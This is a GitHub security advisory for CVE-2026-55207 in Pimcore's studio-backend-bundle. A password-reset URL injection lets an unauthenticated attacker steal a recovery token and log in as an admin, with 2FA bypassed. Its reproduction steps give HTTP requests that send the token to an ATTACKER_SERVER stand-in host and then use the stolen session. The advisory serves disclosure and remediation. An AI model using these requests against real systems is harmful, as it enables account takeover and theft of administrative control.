# [H] Pimcore: Account Takeover via Password Reset URL Injection allows unauthenticated attacker to hijack any admin account with 2FA bypass

## Summary
Severity: High
Advisory: GHSA-h854-c3m3-mh5v
CVE: CVE-2026-55207
CWE: CWE-640
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-h854-c3m3-mh5v
Type: github-advisory

## Affected
- Packagist: `pimcore/studio-backend-bundle` — affected >=0 <2025.4.6
- Packagist: `pimcore/studio-backend-bundle` — affected >=2026.1.0 <2026.1.6

## Details
## Summary

An unauthenticated attacker takes over any Pimcore admin account by sending a password reset request with an attacker-controlled `resetPasswordUrl`. The server generates a real cryptographic recovery token, appends it to the attacker's URL, and emails the link to the victim. When the victim clicks the link in their email, the token is sent to the attacker's server. The attacker then uses `POST /pimcore-studio/api/login/token` to authenticate as the victim with full admin privileges. Token login explicitly disables two-factor authentication, so even accounts with TOTP/Google Authenticator are compromised.

## Vulnerability Details

### Unauthenticated Endpoint Accepts Attacker URL

The reset password endpoint at `src/User/Controller/ResetPasswordController.php` line 53 is public (uses `PUBLIC_STUDIO_API` voter). The `ResetPassword` schema at `src/User/Schema/ResetPassword.php` accepts a `resetPasswordUrl` string as a required parameter with zero validation. No URL scheme check, no domain allowlist, no comparison against the configured system domain.

```php
final readonly class ResetPassword
{
    public function __construct(
        private string $username,
        private string $resetPasswordUrl  // attacker-controlled, no validation
    ) {}
}
```

### Token Appended to Attacker URL

In `src/User/Service/UserLoginService.php` at line 64-65, the service generates a real recovery token and concatenates the attacker's URL with the token:

```php
$token = $this->authenticationResolver->generateTokenByUser($user);
$loginUrl = $resetPassword->getResetPasswordUrl() . '?token=' . $token;
```

The token is generated and stored in the database BEFORE `sendResetPasswordMail()` is called on line 68. Even if email delivery fails, the token exists.

### Token Login Bypasses 2FA

`src/Security/Authenticator/AdminTokenAuthenticator.php` line 60 explicitly disables 2FA on token login:

```php
$pimcoreUser->setTwoFactorAuthentication('required', false);
```

### Token Validity

The token is encrypted with the application secret, valid for 24 hours, and single-use (nullified after authentication). The attacker's server captures it before the victim completes any reset flow.

## Steps to Reproduce

Tested on Pimcore 12.x (2026.x branch, latest commit `82f9ff6`), Docker, PHP 8.4.

### 1. Send password reset with attacker URL (no authentication needed)

```http
POST /pimcore-studio/api/user/reset-password HTTP/1.1
Host: TARGET
Content-Type: application/json

{"username":"admin","resetPasswordUrl":"https://ATTACKER_SERVER:9999/steal"}
```
<img width="1756" height="882" alt="image" src="https://github.com/user-attachments/assets/9cb90c8e-6c08-4cd6-980a-822bbd35dc23" />

- Response: 500 (email delivery failed in test env, but token def5020020bd133... visible in error trace, confirmed generated in DB

### 2. Confirm token was generated

Database query shows the recovery token was created:

```
 name    has_token   token_prefix
 admin   1           def50200cdbd3c1292288a716c623f
```

### 3. Token login (after victim clicks the link in their email)

```http
POST /pimcore-studio/api/login/token HTTP/1.1
Host: TARGET
Content-Type: application/json

{"token":"def50200cdbd3c1292288a716c623f...full_token..."}
```

**Response:**

```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=48d784c5bfcc09c8b897f2ab34038419; path=/; httponly; samesite=strict
Set-Cookie: pimcore_studio_auth_profile_token=d7a9ad; path=/; httponly; samesite=lax
```
<img width="1756" height="679" alt="image" src="https://github.com/user-attachments/assets/53bf8f30-47c1-4398-b386-9929b77a35b5" />

### 4. Verify full admin access with the stolen session

```http
GET /pimcore-studio/api/users HTTP/1.1
Host: TARGET
Cookie: PHPSESSID=48d784c5bfcc09c8b897f2ab34038419
```

**Response:** `HTTP/1.1 200 OK`

```json
{"totalItems":1,"items":[{"id":1,"username":"admin","additionalAttributes":[]}]}
```
<img width="1668" height="906" alt="image" src="https://github.com/user-attachments/assets/8f2b63b0-6357-4fe6-9689-35eb891de5ab" />

Full admin session obtained. All CMS content, assets, PIM data, user accounts, and system configuration are accessible.

## Impact

An unauthenticated attacker who knows a valid admin username takes over the account with full administrative privileges. The only user interaction is the victim clicking a password reset link in a legitimate email from the Pimcore instance. The email comes from the real Pimcore server, making it indistinguishable from a genuine reset email.

The attack bypasses authentication (public endpoint), two-factor authentication (explicitly disabled on token login), and rate limiting (allows 3 attempts per window, trivially worked around with multiple IPs).

Once authenticated as admin, the attacker controls all CMS content, digital assets, PIM product data, user accounts, system configuration, and server-side code execution via class definitions.

## Recommended Fix

Remove the `resetPasswordUrl` parameter entirely and construct the URL server-side from the configured system domain:

```php
$loginUrl = 'https://' . $this->domain . '/admin/login?token=' . $token;
```

If the frontend needs to specify the URL for multi-domain setups, validate the host against the configured domain and any registered Site domains.

## Supporting Materials

- Live-tested on Pimcore 12.x (2026.x branch, Docker, PHP 8.4)
- Package: `pimcore/studio-backend-bundle`
- Distinct from CVE-2021-39189 (user enumeration in password reset, not URL injection)

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-h854-c3m3-mh5v
- https://nvd.nist.gov/vuln/detail/CVE-2026-55207
- https://github.com/pimcore/studio-backend-bundle/pull/1882
- https://github.com/pimcore/studio-backend-bundle/commit/ea9d329686f5e5aea2eec378d63ac2deb965bb27
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2025.4.6
- https://github.com/pimcore/studio-backend-bundle/releases/tag/v2026.1.6
